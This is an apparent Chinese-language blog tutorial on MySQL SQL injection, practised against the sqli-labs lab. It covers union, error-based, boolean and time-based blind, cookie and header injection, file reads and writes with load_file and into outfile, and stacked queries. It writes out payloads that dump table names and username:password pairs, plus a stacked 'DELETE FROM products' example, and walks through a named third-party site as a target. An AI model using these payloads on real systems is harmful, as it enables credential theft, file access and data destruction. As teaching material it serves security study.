@@ -1,0 +1,326 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>SQL注入 | Ephemeral-fever</title><meta name="keywords" content="sql注入"><meta name="author" content="Ephemeral-fever"><meta name="copyright" content="Ephemeral-fever"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><meta name="description" content="预备知识mysql必备函数 database()：返回当前数据库 version()：返回数据库版本 user()：返回当前用户 concat(s1,s2…sn)：字符串 s1,s2…sn 等多个字符串合并为一个字符串，用于合并多个字符串 concat_ws(x, s1,s2…sn)：同concat(s1,s2,…sn) 函数，但是每个字符串之间要加上 x，x 可以是分隔符，用于合并多个字符串，并">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SQL注入">
+<meta property="og:url" content="http://example.com/2021/12/30/SQL%E6%B3%A8%E5%85%A5/index.html">
+<meta property="og:site_name" content="Ephemeral-fever">
+<meta property="og:description" content="预备知识mysql必备函数 database()：返回当前数据库 version()：返回数据库版本 user()：返回当前用户 concat(s1,s2…sn)：字符串 s1,s2…sn 等多个字符串合并为一个字符串，用于合并多个字符串 concat_ws(x, s1,s2…sn)：同concat(s1,s2,…sn) 函数，但是每个字符串之间要加上 x，x 可以是分隔符，用于合并多个字符串，并">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/img/pic22.jpg">
+<meta property="article:published_time" content="2021-12-30T15:12:10.000Z">
+<meta property="article:modified_time" content="2021-12-30T15:13:39.506Z">
+<meta property="article:author" content="Ephemeral-fever">
+<meta property="article:tag" content="sql注入">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/img/pic22.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://example.com/2021/12/30/SQL%E6%B3%A8%E5%85%A5/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><meta name="yandex-verification" content="{&quot;enable&quot;:true}"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css"><script>var GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  ClickShowText: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  justifiedGallery: {
+    js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
+    css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isanchor: false
+};
+
+var saveToLocal = {
+  set: function setWithExpiry(key, value, ttl) {
+    const now = new Date()
+    const expiryDay = ttl * 86400000
+    const item = {
+      value: value,
+      expiry: now.getTime() + expiryDay,
+    }
+    localStorage.setItem(key, JSON.stringify(item))
+  },
+
+  get: function getWithExpiry(key) {
+    const itemStr = localStorage.getItem(key)
+
+    if (!itemStr) {
+      return undefined
+    }
+    const item = JSON.parse(itemStr)
+    const now = new Date()
+
+    if (now.getTime() > item.expiry) {
+      localStorage.removeItem(key)
+      return undefined
+    }
+    return item.value
+  }
+}</script><script id="config_change">var GLOBAL_CONFIG_SITE = { 
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2021-12-30 23:13:39'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(function () {  window.activateDarkMode = function () {
+    document.documentElement.setAttribute('data-theme', 'dark')
+    if (document.querySelector('meta[name="theme-color"]') !== null) {
+      document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+    }
+  }
+  window.activateLightMode = function () {
+    document.documentElement.setAttribute('data-theme', 'light')
+   if (document.querySelector('meta[name="theme-color"]') !== null) {
+      document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+    }
+  }
+  const autoChangeMode = 'false'
+  const t = saveToLocal.get('theme')
+  if (autoChangeMode === '1') {
+    const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
+    const isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
+    const isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
+    const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified
+    if (t === undefined) {
+      if (isLightMode) activateLightMode()
+      else if (isDarkMode) activateDarkMode()
+      else if (isNotSpecified || hasNoSupport) {
+        const now = new Date()
+        const hour = now.getHours()
+        const isNight = hour <= 6 || hour >= 18
+        isNight ? activateDarkMode() : activateLightMode()
+      }
+      window.matchMedia('(prefers-color-scheme: dark)').addListener(function (e) {
+        if (saveToLocal.get('theme') === undefined) {
+          e.matches ? activateDarkMode() : activateLightMode()
+        }
+      })
+    } else if (t === 'light') activateLightMode()
+    else activateDarkMode()
+  } else if (autoChangeMode === '2') {
+    const now = new Date()
+    const hour = now.getHours()
+    const isNight = hour <= 6 || hour >= 18
+    if (t === undefined) isNight ? activateDarkMode() : activateLightMode()
+    else if (t === 'light') activateLightMode()
+    else activateDarkMode()
+  } else {
+    if (t === 'dark') activateDarkMode()
+    else if (t === 'light') activateLightMode()
+  }const asideStatus = saveToLocal.get('aside-status')
+if (asideStatus !== undefined) {
+   if (asideStatus === 'hide') {
+     document.documentElement.classList.add('hide-aside')
+   } else {
+     document.documentElement.classList.remove('hide-aside')
+   }
+}})()</script><meta name="generator" content="Hexo 5.2.0"></head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">加载中...</div></div></div><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="author-avatar"><img class="avatar-img" src="/img/head-sculpture.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">文章</div><div class="length-num">43</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/tags/"><div class="headline">标签</div><div class="length-num">12</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/categories/"><div class="headline">分类</div><div class="length-num">8</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div></div></div></div><div id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/img/pic22.jpg)"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">Ephemeral-fever</a></span><span id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div></div><span class="close" id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></span></span></nav><div id="post-info"><h1 class="post-title">SQL注入</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2021-12-30T15:12:10.000Z" title="发表于 2021-12-30 23:12:10">2021-12-30</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2021-12-30T15:13:39.506Z" title="更新于 2021-12-30 23:13:39">2021-12-30</time></span></div><div class="meta-secondline"> <span class="post-meta-separator">|</span><span class="post-meta-pv-cv"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="预备知识"><a href="#预备知识" class="headerlink" title="预备知识"></a>预备知识</h1><h2 id="mysql必备函数"><a href="#mysql必备函数" class="headerlink" title="mysql必备函数"></a>mysql必备函数</h2><ol>
+<li>database()：返回当前数据库</li>
+<li>version()：返回数据库版本</li>
+<li>user()：返回当前用户</li>
+<li>concat(s1,s2…sn)：字符串 s1,s2…sn 等多个字符串合并为一个字符串，用于合并多个字符串</li>
+<li>concat_ws(x, s1,s2…sn)：同concat(s1,s2,…sn) 函数，但是每个字符串之间要加上 x，x 可以是分隔符，用于合并多个字符串，并添加分隔符</li>
+<li>group_concat：将相同行的指定列的数据连在一起</li>
+<li>substr(s, start, length)：从字符串 s 的 start 位置截取长度为 length 的子字符串</li>
+<li>ascii(s)：返回字符串 s 的第一个字符的 ASCII 码</li>
+<li>if(expr,v1,v2)    如果表达式 expr 成立，返回结果 v1；否则，返回结果 v2</li>
+<li>left()函数是一个字符串函数，它返回具有指定长度的字符串的左边部分。<br>left(str,length)：接收两个参数：<br>str：一个字符串；<br>length：想要截取的长度，是一个正整数；</li>
+<li>right()函数同理，从右侧截取</li>
+</ol>
+<h2 id="必备语句"><a href="#必备语句" class="headerlink" title="必备语句"></a>必备语句</h2><p>（1）</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">show databases; -- 显示mysql中所有数据库名称</span><br></pre></td></tr></table></figure>
+
+<p>（2）</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">show tables; -- 显示当前数据库中所有表的名称。</span><br><span class="line">show tables from database_name; -- 显示指定数据库中所有表的名称</span><br></pre></td></tr></table></figure>
+
+<p>（3）</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">show columns from table_name from database_name; </span><br><span class="line">show columns from database_name.table_name; -- 显示表中列名称。</span><br></pre></td></tr></table></figure>
+
+<h2 id="几个例子"><a href="#几个例子" class="headerlink" title="几个例子"></a>几个例子</h2><p>1.<strong>基本查询</strong></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt; select * from aa;</span><br><span class="line">+------+------+</span><br><span class="line">| id| name |</span><br><span class="line">+------+------+</span><br><span class="line">|1 | 10|</span><br><span class="line">|1 | 20|</span><br><span class="line">|1 | 20|</span><br><span class="line">|2 | 20|</span><br><span class="line">|3 | 200 |</span><br><span class="line">|3 | 500 |</span><br><span class="line">+------+------+</span><br></pre></td></tr></table></figure>
+
+<p>2.<strong>以id分组，把name字段的值打印在一行，逗号分隔(默认)</strong></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt; select id,group_concat(name) from aa group by id;</span><br><span class="line">+------+--------------------+</span><br><span class="line">| id| group_concat(name) |</span><br><span class="line">+------+--------------------+</span><br><span class="line">|1 | 10,20,20|</span><br><span class="line">|2 | 20 |</span><br><span class="line">|3 | 200,500|</span><br><span class="line">+------+--------------------+</span><br></pre></td></tr></table></figure>
+
+<p>3.<strong>以id分组，把name字段的值打印在一行，分号分隔</strong></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt; select id,group_concat(name separator &#39;;&#39;) from aa group by id;</span><br><span class="line">+------+----------------------------------+</span><br><span class="line">| id| group_concat(name separator &#39;;&#39;) |</span><br><span class="line">+------+----------------------------------+</span><br><span class="line">|1 | 10;20;20 |</span><br><span class="line">|2 | 20|</span><br><span class="line">|3 | 200;500 |</span><br></pre></td></tr></table></figure>
+
+<h2 id="mysql的全局变量"><a href="#mysql的全局变量" class="headerlink" title="mysql的全局变量"></a>mysql的全局变量</h2><p>@@datadir    数据库存储路径<br>@@basedir    mysql安装路径</p>
+<h2 id="几个常用符号的ASCII码"><a href="#几个常用符号的ASCII码" class="headerlink" title="几个常用符号的ASCII码"></a>几个常用符号的ASCII码</h2><table>
+<thead>
+<tr>
+<th>16进制</th>
+<th>符号</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>0x3a</td>
+<td>:</td>
+</tr>
+<tr>
+<td>0x7e</td>
+<td>~</td>
+</tr>
+</tbody></table>
+<h2 id="MySQL中3种注释风格"><a href="#MySQL中3种注释风格" class="headerlink" title="MySQL中3种注释风格"></a>MySQL中3种注释风格</h2><p>单行注释：#后面直接加注释 #this is a comment<br>多行注释：/<em>注释内容</em>/中间可以跨行<br>单行注释：– 后面必须要加空格</p>
+<p>内联注释：/<em>!注释内容</em>/<br>内联注释是MySQL为了保持与其他数据兼容，将MySQL中特有的语句放在/<em>!…</em>/中，这些语句在不兼容的数据库中不执行，而在MySQL自身却能识别，执行。</p>
+<p>详细可参考以下博客：</p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/123fantao/p/8269287.html">mysql show命令用法 - 凡_仁 - 博客园 (cnblogs.com)</a></p>
+<h1 id="联合查询注入"><a href="#联合查询注入" class="headerlink" title="联合查询注入"></a>联合查询注入</h1><blockquote>
+<p>information_schema是MySQL中简单的信息数据库，里面都是视图，不是表，所以没有具体文件，在这个数据库里面有以下几个比较敏感的视图：</p>
+</blockquote>
+<table>
+<thead>
+<tr>
+<th>视图名</th>
+<th>视图作用</th>
+<th></th>
+<th>视图下的重要字段</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>schemata</td>
+<td>数据库信息</td>
+<td></td>
+<td>schema_name（数据库名）</td>
+</tr>
+<tr>
+<td>tables</td>
+<td>数据库和表的关系</td>
+<td></td>
+<td>table_schema（数据库名称）、 table_name（表名）</td>
+</tr>
+<tr>
+<td>columns</td>
+<td>表和列的关系</td>
+<td></td>
+<td>table_schema（数据库名）、 column_name（列名）、table_name（表名）</td>
+</tr>
+</tbody></table>
+<p>  schemata-&gt;数据库信息<br>    schema_name 数据库名<br>   <code> ...union select 1,group_concat(schema_name),3 from  information_schema.schemata</code><br>    由此查到了所有数据库</p>
+<p>  tables-&gt;数据库和表的关系<br>    table_schema 数据库名称<br>    table_name 表名<br>   <code> ...union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#39;上一步查到的数据库&#39;</code><br>    由此查到了目标数据库的下的所有表</p>
+<p>  columns-&gt;表和列的关系<br>    table_schema 数据库名<br>    column_name 列名<br>    table_name 表名<br>   <code>...union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=database() and table_name=&#39;users&#39;</code><br>    由此查到了目标表下的所有列名</p>
+<p>查到了列和表的具体信息，接下来查询具体数据<br>select 列名 from 表 where 条件<br><code>...union select 1,group_concat(id,0x3a,username,0x3a,password),3 from users</code><br>0x3a表示冒号</p>
+<p>MYSQL基本了解：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/lyftest/p/8034470.html#intru">mysql中information_schema说明 - 一叶扁舟_test - 博客园 (cnblogs.com)</a></p>
+<p>双查询注入：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/-zhong/p/10892439.html">sqli-labs(5) - N0lan - 博客园 (cnblogs.com)</a></p>
+<h1 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h1><p>报错注入在没法用union联合查询时用，但前提还是不能过滤一些关键的函数。</p>
+<h2 id="（1）通过extractvalue"><a href="#（1）通过extractvalue" class="headerlink" title="（1）通过extractvalue()"></a>（1）通过extractvalue()</h2><p>extractvalue(xml_frag, xpath_expr)<br>extractvalue()接受两个字符串参数，一个XML标记片段 xml_frag和一个XPath表达式 xpath_expr（也称为 定位器）; 它返回CDATA第一个文本节点的text（），该节点是XPath表达式匹配的元素的子元素。<br>第一个参数可以传入目标xml文档，第二个参数是用Xpath路径法表示的查找路径</p>
+<p>第二个参数 xml中的位置是可操作的地方，xml文档中查找字符位置是用 /xxx/xxx/xxx/…这种格式，如果我们写入其他格式，就会报错，并且会返回我们写入的非法格式内容，而这个非法的内容就是我们想要查询的内容。</p>
+<p>查数据库名：<br><code>...and extractvalue(1,concat(0x7e,(select database())))...</code>或<br><code>...union select 1,extractvalue(1,concat(0x7e,(select database())))...</code><br><strong>注意：concat里面的查询语句要用括号包起来</strong></p>
+<p>查表名：<br><code>...abd extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database() limit 0,1)))...</code>或<br><code>...union select 1,extractvalue(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 0,1)))...</code><br><strong>注意：有时只能输出一行，可用limit 0，1限制输出行数，然后自行更改第一个参数</strong></p>
+<p>查列名：<br><code>...and extractvalue(1,concat(0x7e,(select column_name from information_schema.columns where table_name=&#39;目标表&#39; limit 0,1)))...</code>或<br><code>...union select 1,extractvalue(1,concat(0x7e,(select column_name from information_schema.columns where table_schema=database() and table_name=&#39;目标表&#39; limit 0,1)))...</code><br><strong>注意：有时只能输出一行，可用limit 0，1限制输出行数，然后自行更改第一个参数</strong></p>
+<p>查具体数据：<br><code>...and extractvalue(1,concat(0x7e,(select username from users limit 0,1)))...</code>或<br><code>...union select 1,extractvalue(1,concat(0x7e,(select username from users limit 0,1)))...</code></p>
+<p>有一点需要注意，extractvalue()能查询字符串的最大长度为32，就是说如果我们想要的结果超过32，就需要用substring()函数截取，一次查看32位<br>这里查询前5位示意:<br><code>select username from security.user where id=1 and (extractvalue(‘anything’,concat(‘#’,substring((select database()),1,5))))</code></p>
+<h2 id="（2）通过updatexml"><a href="#（2）通过updatexml" class="headerlink" title="（2）通过updatexml()"></a>（2）通过updatexml()</h2><p>updatexml()函数与extractvalue()类似，报错方式相同，是更新xml文档的函数。<br>语法：updatexml(目标xml文档，xml路径，更新的内容)</p>
+<p>查数据库名：<br><code>...and updatexml(1,concat(0x7e,(select database())),1)...</code><br><strong>注意：concat里面的查询语句要用括号包起来</strong></p>
+<p>查表名：<br><code>...and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 0,1)),1)...</code><br><strong>注意：有时只能输出一行，可用limit 0，1限制输出行数，然后自行更改第一个参数</strong></p>
+<p>查列名：<br><code>...and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_schema=database() and table_name=&#39;目标表&#39; limit 0,1)),1)...</code></p>
+<p>查具体数据：<br><code>...and updatexml(1,concat(0x7e,(select username from users limit 0,1)),1)...</code></p>
+<p>extractvalue()能查询字符串的最大长度也为32</p>
+<h2 id="（3）通过concat-rand-group-by-导致主键重复"><a href="#（3）通过concat-rand-group-by-导致主键重复" class="headerlink" title="（3）通过concat+rand()+group_by()导致主键重复"></a>（3）通过concat+rand()+group_by()导致主键重复</h2><p>这种报错方法的本质是因为floor(rand(0)*2)的重复性，导致group by语句出错。group by key的原理是循环读取数据的每一行，将结果保存于临时表中。读取每一行的key时，如果key存在于临时表中，则不在临时表中更新临时表的数据；如果key不在临时表中，则在临时表中插入key所在行的数据。</p>
+<p>rand()：<br>生成0~1之间的随机数，可以给定一个随机数的种子，对于每一个给定的种子，rand()函数都会产生一系列可以复现的数字</p>
+<p>floor()：<br>对任意正或者负的十进制值向下取整</p>
+<p>查表名：<br><code>...union select 1,count(1) from information_schema.tables group by concat(floor(rand()*2),(select table_name from information_schema.tables where table_schema=database() limit 0,1))</code></p>
+<p>查列名：<br><code>union select 1,count(1) from information_schema.tables group by concat(floor(rand()*2),(select column_name from information_schema.columns where table_name=&#39;user&#39; limit 0,1))</code></p>
+<h1 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h1><h2 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h2><p>length()：返回字符串长度<br>mid(),substr()或substring()：三个参数，用于截取字符串，第一个参数为要截取的字符串，第二、第三个参数分别指定起始位置和截取长度<br>ascii()和ord()：返回单个字符的ASCII码</p>
+<p>判断数据库名长度：<br><code>...or (select length(database()))=? --+</code><br>通过改变?的数值，来判断是否正确，若页面回显，即条件为真，即长度为真</p>
+<p>查数据库名：<br><code>...or (select ascii(substr(database(),1,1)))=? --+</code><br>改变?处的ascii值并根据是否回显判断是否正确，改变substr（）函数的第二个参数来截取第几个字母，需要的字母个数已由上一步查出。</p>
+<p>查表名：<br><code>...or (select ascii(substr((table_name),1,1)) from information_schema.tables where table_schema=database() limit 0,1)=? --+</code><br>通过修改?的值并根据页面回显判断是否正确，通过修改substr（）函数第二个参数来切换第几个字母，通过修改limit第一个参数来切换行<br>或<br>预处理——判断长度：<code>...or (select length(group_concat(table_name)) from information_schema.tables where table_schema=database())=? --+</code><br>通过修改?的值并根据页面回显判断长度是否正确（注意：group_concat（）函数的默认分隔符逗号也算一个字符，系统计算长度时也包括它）<br><code>...or (select ascii(substr((group_concat(table_name)),1,1)) from information_schema.tables where table_schema=database())=? --+</code><br>通过修改?的值并根据页面回显判断是否正确，通过修改substr（）函数第二个参数来切换第几个字母（免去了换行的麻烦）</p>
+<p>查列名：<br>同上</p>
+<p>查具体数据：<br>预处理——判断长度：<code>...or (select length(group_concat(username,0x3a,password)) from users)=?--+</code><br>通过修改?的值并根据页面回显判断长度是否正确<br><code>...or (select ascii(substr((group_concat(username,0x3a,password)),1,1)) from users)=? --+</code><br>通过修改?的值并根据页面回显判断是否正确，通过修改substr（）函数第二个参数来切换第几个字母</p>
+<h2 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h2><p>if(expr,v1,v2)：如果表达式 expr 成立，返回结果 v1；否则，返回结果 v2。<br>sleep(n)：休眠n秒</p>
+<p>判断数据库名长度：<br><code>...or if((select length(database()))&gt;?,sleep(2),0)--+</code><br>通过改变?的数值，来判断是否正确，若页面延迟，即条件为真，即长度为真</p>
+<p>查数据库名：<br><code>...or if((select ascii(substr(database(),1,1)))=?,sleep(2),0)--+</code><br>改变?处的ascii值并根据是否延迟判断是否正确，改变substr（）函数的第二个参数来截取第几个字母，需要的字母个数已由上一步查出。</p>
+<p>查表名：<br><code>...or if((select ascii(substr(group_concat(table_name),1,1)) from information_schema.tables where table_schema=database())&gt;?,sleep(2),0) --+</code><br>改变?处的ascii值并根据是否延迟判断是否正确，改变substr（）函数的第二个参数来截取第几个字母，需要的字母个数类似第一步可查出。</p>
+<p>查列名：<br>同上</p>
+<p>查具体数据：<br>预处理——判断长度：<code>...or if((select length(group_concat(username,0x3a,password)) from users)=?,sleep(2),0)--+</code><br>通过修改?的值并根据页面延迟判断长度是否正确<br><code>...or if((select ascii(substr((group_concat(username,0x3a,password)),1,1)) from users)=? ,sleep(2),0)--+</code><br>通过修改?的值并根据页面延迟判断是否正确，通过修改substr（）函数第二个参数来切换第几个字母</p>
+<p>===============================================================</p>
+<h1 id="cookie注入"><a href="#cookie注入" class="headerlink" title="cookie注入"></a>cookie注入</h1><p>建议参考：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/insane-Mr-Li/p/9142681.html">cookie注入原理详解（一） - tooltime - 博客园 (cnblogs.com)</a></p>
+<p><strong>判断是不是注入点：</strong></p>
+<p>下面还是具体拿个实例来给大家演示下，目标站：<a target="_blank" rel="noopener" href="http://www.2cto.com/">http://www.2cto.com</a> /Products_show.asp?id=284，同时也是注入点。我们首先要检测下按照平时的方式注入，在网址后面加 and 1=1。失败。<br>可见是使用了防注入系统的，但是目前我们是使用get方式提交的参数，那现在我们将“id=284”这个参数使用cookie提交看看程序对数据接收是否直接使用 request(“xx”)的方式。</p>
+<p>操作步骤：</p>
+<ol>
+<li>要更改成cookie方式提交，我们首先要访问正常的页面，即是：<a target="_blank" rel="noopener" href="http://www.2cto.com/">http://www.2cto.com</a> /Products_show.asp?id=284，等页面完全打开之后</li>
+<li>我们将IE地址栏清空</li>
+<li>然后写上:javascript:alert(document.cookie=”id=”+escape(“284”)); 这里的“id=”便是“Products_show.asp?id=284”中的“id=”，“escape(“284”)”中的“284”是“Products_show.asp?id=284”中的“id=284”了，这两处要根据实际情况来定义。</li>
+<li>写完之后按下回车网页中会弹出一个对话框</li>
+<li>点击页面上出现的确定框。</li>
+</ol>
+<p><strong>验证是否改好了cookie：</strong></p>
+<p>现在更改好了cookie后我们就要试下能不能正常访问了，现在在另外一个窗口中我们打开以下地址：<a target="_blank" rel="noopener" href="http://www.2cto.com/">http://www.2cto.com</a> /Products_show.asp? 既是将“id=284”去掉后的，然后看是否能正常访问。结果可以。</p>
+<p>　　可见访问之后的页面与访问<a target="_blank" rel="noopener" href="http://www.2cto.com/">http://www.2cto.com</a> /Products_show.asp?id=284的时候是一样的，这样就说明程序在使用request对象获取数据的时候并未指明具体使用什么方法来获取，而是直接使用request(“xx”)的方式。现在cookie形成的一个重要因素已经明确了，接下来我们测试下能否提交特殊字符，看程序是否对数据进行过滤。这里就是常规步骤了，略过不表。</p>
+<h1 id="referer注入-amp-uagent注入"><a href="#referer注入-amp-uagent注入" class="headerlink" title="referer注入&amp;uagent注入"></a>referer注入&amp;uagent注入</h1><p>同cookie注入<br>闭合骚操作：<br>假设sql语句为：<code>INSERT INTO security.uagents (uagent, ip_address, username) VALUES (&#39;$uagent&#39;, &#39;$IP&#39;, $uname)</code><br>若对uagent进行注入VALUES (‘’and (此处可自由发挥) and’’, ‘$IP’, $uname)<br>即uagent为：’and (此处可自由发挥) and’</p>
+<h1 id="读写文件"><a href="#读写文件" class="headerlink" title="读写文件"></a>读写文件</h1><p>1、load_file()导出文件<br>load_file（file_name）：读取文件并返回该文件内容作为一个字符串。<br>使用条件：<br>A:必须有权限读取并且文件完全可读<br>B:预读取文件必须在服务器上<br>C:必须指定文件完整路径<br>D:预读取文件必修小于max_allowed_packet</p>
+<p>如果该文件不存在，或因为上面的任一原因而不能被读出，函数返回空。比较难满足的 就是权限，在 windows 下，如果 NTFS 设置得当，是不能读取相关的文件的，当遇到只有 administrators 才能访问的文件，users就别想 load_file 出来。</p>
+<p>在实际的注入中，我们有两个难点需要解决： 绝对物理路径 构造有效的畸形语句 （报错爆出绝对路径） 在很多 PHP 程序中，当提交一个错误的 Query，如果 display_errors=on，程序就会暴露 WEB 目录的绝对路径，只要知道路径，那么对于一个可以注入的 PHP 程序来说，整个服务 器的安全将受到严重的威胁。</p>
+<p>2、导入到文件：<br>into outfile<br>可以把被选择的行写入一个文件中。该文件被创建到服务器主机上，因此您必须拥有 FILE 权限，才能使用此语法。file_name 不能是一个已经存在的文件。</p>
+<p>@@datadir    数据库存储路径<br>@@basedir    mysql安装路径</p>
+<p>（1）@@secure_file_priv<br>这个参数主要用来限制数据的导入导出效果（load data, into outfile等）。如果这个参数值为NULL，那么mysql会禁止用户进行导入导出操作；如果这个参数是一个具体的目录名，那么数据的导入导出只能在该目录下进行；如果这个参数为空，那么导入导出的文件位置将不受限制。<br>该参数的设置，可以在my.cnf配置文件中修改，而在搭建的SQLi-Labs环境中下需要在配置的phpstudy环境中修改，具体修改方法因配置环境而异，此处不作讲解。<br>（2）@@datadir<br>这个参数是MySql存放数据文件的目录，也是导入导出操作的相对路径<br>（3）PrivateTmp<br>使用Systemd进程作为启动进程的linux系统，其子进程都会有一个属性叫PrivateTmp，用于设置是否使用私有的tmp目录。</p>
+<p>读文件：<br>…union select 1,2,load_file(“文件绝对路径”)<br>但上面读出来的字符有些会被转义，所以用…union select 1,2,hex(load_file(“文件绝对路径”))<br>注意文件路径里面要用双反斜杠，因为其中一个会被转义</p>
+<p>导入到文件：<br>…union select 1,2,3 into outfile(“文件路径”)<br>路径同样要用双反斜杠</p>
+<h1 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h1><p>在SQL中，分号（;）是用来表示一条sql语句的结束。试想一下我们在 ; 结束一个sql语句后继续构造下一条语句，会不会一起执行？因此这个想法也就造就了堆叠注入。而union injection（联合注入）也是将两条语句合并在一起，两者之间有什么区别么？区别就在于union 或者union all执行的语句类型是有限的，可以用来执行查询语句，而堆叠注入可以执行的是任意的语句。例如以下这个例子。用户输入：<code>1; DELETE FROM products</code>服务器端生成的sql语句为：（因未对输入的参数进行过滤）<code>Select * from products where productid=1;DELETE FROM products</code>当执行查询后，第一条显示查询信息，第二条则将整个表进行删除。</p>
+<p>show databases:列出 MySQL 数据库管理系统的数据库列表。<br>show tables:显示当前数据库的所有表<br>show columns from 数据表:显示数据表的属性，属性类型，主键信息 ，是否为 NULL，默认值等其他信息。<br>添加列：<br>alter table 表名 add column 列名 varchar(30);<br>修改列名： alter table 表名 change 原列名 新列名 数据类型;<br>修改表名：<br>rename table 原表名 to 新表名<br>alter table 原表名 rename to 新表名</p>
+<p>定义预处理语句</p>
+<p>PREPARE stmt_name FROM preparable_stmt;</p>
+<p>执行预处理语句</p>
+<p>EXECUTE stmt_name [USING @var_name [, @var_name] …];</p>
+<p>删除(释放)定义</p>
